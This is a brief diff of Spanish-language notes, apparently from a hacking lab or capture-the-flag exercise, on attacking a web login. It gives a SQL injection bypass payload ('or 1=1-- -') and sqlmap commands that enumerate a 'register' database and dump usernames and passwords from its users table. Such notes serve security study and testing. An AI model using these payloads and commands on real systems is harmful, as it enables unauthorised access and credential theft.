@@ -1,0 +1,15 @@
+INJECTTION (2_Hac.....
+
+	Puerto 80 (LOGIN)
+	
+		usuario' or 1=1-- -
+		sadasd
+			
+	Con BurpSuite, buscar la petición del POST y copiarla en un .txt
+	
+	Ahora se usa la herramienta sqlmap para que explote la inyección SQL 
+	
+		sqlmap -r request.txt --dbs --batch
+		sqlmap -r request.txt -D register --tables --batch
+		sqlmap -r request.txt -D register -T users --columns --batch
+		sqlmap -r request.txt -D register -T users -C username,passwd --dump --batch
